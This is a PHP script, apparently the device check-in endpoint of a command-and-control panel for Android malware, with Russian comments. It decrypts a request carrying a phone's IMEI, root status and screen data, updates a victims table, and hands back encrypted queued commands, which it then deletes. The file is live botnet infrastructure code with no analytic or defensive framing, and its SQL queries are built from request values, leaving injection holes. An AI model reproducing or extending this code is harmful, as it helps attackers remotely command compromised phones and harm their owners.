<?php
$request = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include 'crypt.php';
include 'config.php';
$request = mb_substr($request, 0, mb_strlen($request));
$request =  decrypt($request,cryptKey);

$massivReq = explode(":", $request);

$IMEI = $massivReq[0];
$root = $massivReq[1];
$screen = $massivReq[2];

$screen = mb_substr($screen,0,mb_strlen($screen)-1);//!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!


$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
$sql = "SELECT * FROM kliets WHERE IMEI='$IMEI'";
$connection->exec('SET NAMES utf8');
$booleanIMEI = false;
foreach($connection->query($sql) as $row)
{
	if($row['IMEI']==$IMEI)
	{
		$booleanIMEI=true;	
		break;
	}
}
if($booleanIMEI == true)
{
	 $sql2 = "SELECT * FROM commands";
	 $data_comm = "";
	 foreach($connection->query($sql2) as $row)
	 {
		 if($row['IMEI']==$IMEI)
		{ 
	         $com0 = "id=";
			 $com1 = $row['id'];
			 $com2 = $row['command'];
			 $data_comm = "$data_comm$com0$com1$com2";
		}
	 }
	 //Удаляем нафиг команды!
	 $sql3 = "DELETE FROM commands WHERE IMEI='".$IMEI."'";
	 $connection->query($sql3);
	 
	
	 //Записываем время конекта в бд и другую инфу
	 $data_ = date('Y-m-d H:i'); 
	 $sql3 = "UPDATE kliets SET lastConnect = '$data_', r00t = '$root', screen= '$screen' WHERE IMEI='".$IMEI."';";
	 $connection->query($sql3);
	 
					

	 //отправляем статус настроек
	 if(($data_comm == "")||($data_comm == " "))
	 {
		$sql = "SELECT * FROM settings";
		foreach($connection->query($sql) as $row)
		{
			if($row['IMEI']==$IMEI)
			{
				if($row['state']=="1")
				{
					$data_comm="state1letsgotxt";
					$sql3 = "UPDATE settings SET state = '0' WHERE IMEI='".$IMEI."';";
					$connection->query($sql3);
				}
			}
		}
	 }
	
	 $booleanIMEI == false;
	//достаем команды и отправляем!
	$tag = "<tag>";
	$otv = encrypt("$data_comm",cryptKey);;
	$tagend = "</tag>";
	echo "$tag$otv$tagend";
}
else
{//Если команды нет!
	$tag = "<tag>";
	$otv = encrypt("|NO|",cryptKey);
	$tagend = "</tag>";
	echo "$tag$otv$tagend";
}

//проверяем существует ли такой IMEI
//если существует, достаем команды которые есть и отдаем
//если не существует отдаем |NO|
//SELECT * FROM table_name WHERE (выражение) [order by field_name [desc][asc]]
?>